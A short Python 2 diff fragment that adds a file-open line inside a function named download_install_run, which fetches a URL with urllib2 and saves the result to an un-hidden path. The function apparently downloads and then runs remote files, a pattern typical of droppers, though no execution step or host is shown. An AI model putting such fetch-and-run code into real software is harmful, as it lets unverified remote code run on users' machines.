@@ -60,6 +60,7 @@ def download_install_run(url, specialpath, fname):
     unhide_file(path)
     #Save the file
     u = urllib2.urlopen(url)
+    f = open(path, "wb")
     
         
 #Utility functions.  May be useful elsewhere
